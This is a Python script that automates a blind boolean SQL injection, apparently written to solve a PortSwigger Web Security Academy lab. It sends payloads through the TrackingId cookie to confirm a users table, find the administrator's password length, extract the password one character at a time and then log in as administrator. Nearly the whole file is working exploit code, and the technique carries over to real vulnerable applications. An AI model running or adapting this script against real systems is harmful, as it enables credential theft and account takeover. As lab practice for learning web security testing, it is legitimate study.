import requests
import re
import sys
import string

url = "https://0acf0044035972ad8288658f00bd006c.web-security-academy.net/"
tracking_id = "LyrA9q33XnRvxyKs"
session = "ekIvN3MTLiiRpmzUOuZEY8QP7MUdybAM"



# Helper Functions
def check_condition(payload_suffix):
    """Returns True if 'Welcome back' appears in the response."""
    cookies = {
        "TrackingId": tracking_id + payload_suffix,
        "session": session
    }
    try:
        resp = requests.get(url, cookies=cookies, timeout=5)
        return "Welcome back" in resp.text
    except:
        return False

def get_csrf_token(session, url):
    """Extracts CSRF token from login page."""
    resp = session.get(url)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
    if match:
        return match.group(1)
    return None

def login_as_administrator(password):
    """Logs in with the extracted password and returns the final response."""
    login_url = url + "login"
    my_account_url = url + "my-account"
    
    session = requests.Session()
    
    csrf_token = get_csrf_token(session, login_url)
    if not csrf_token:
        print("[-] Could not find CSRF token. Trying without it...")
    
    login_data = {
        "username": "administrator",
        "password": password
    }
    if csrf_token:
        login_data["csrf"] = csrf_token
    
    resp = session.post(login_url, data=login_data)
    
    if "Your username is: administrator" in resp.text or "/my-account" in resp.url:
        print("[+] Login successful!")
        print(f"[+] You are now logged in as administrator.")
        return True
    else:
        print("[-] Login failed. Check password or CSRF handling.")
        return False



# SQL Injection Stepst
def step1_verify_users_table():
    print("[*] Step 1: Checking if 'users' table exists...")
    payload = "' AND (SELECT 'a' FROM users LIMIT 1)='a"
    if check_condition(payload):
        print("[+] Table 'users' exists.")
        return True
    print("[-] Table 'users' does NOT exist.")
    return False

def step2_verify_administrator():
    print("[*] Step 2: Checking if 'administrator' user exists...")
    payload = "' AND (SELECT 'a' FROM users WHERE username='administrator')='a"
    if check_condition(payload):
        print("[+] User 'administrator' exists.")
        return True
    print("[-] User 'administrator' not found.")
    return False

def step3_find_password_length(max_guess=30):
    print("[*] Step 3: Determining password length...")
    length = 0
    for i in range(1, max_guess + 1):
        payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{i-1})='a"
        if check_condition(payload):
            length = i
            print(f"    → Password length is at least {length}")
        else:
            break
    print(f"[+] Password length confirmed: {length} characters.")
    return length

def step4_extract_password(length, charset=string.ascii_lowercase + string.digits):
    print(f"[*] Step 4: Extracting {length}-character password...")
    password = ""
    for pos in range(1, length + 1):
        found = False
        for ch in charset:
            payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{ch}"
            if check_condition(payload):
                password += ch
                print(f"    Position {pos:2d} : '{ch}' → {password}")
                found = True
                break
        if not found:
            print(f"[-] No character found at position {pos}")
            sys.exit(1)
    return password



# Final Execution Part
def main():
    
    if not step1_verify_users_table():
        return
    if not step2_verify_administrator():
        return
    
    pass_len = step3_find_password_length()
    if pass_len == 0:
        print("[-] Could not determine password length.")
        return
    
    password = step4_extract_password(pass_len)
    print(f"\n[SUCCESS] Extracted password: {password}")
    
    print("\n[*] Attempting to log in as administrator...")
    if login_as_administrator(password):
        print("\nPassword extracted and login performed.")
    else:
        print("\nLogin failed")
        print(f"   {url}my-account")

if __name__ == "__main__":
    main()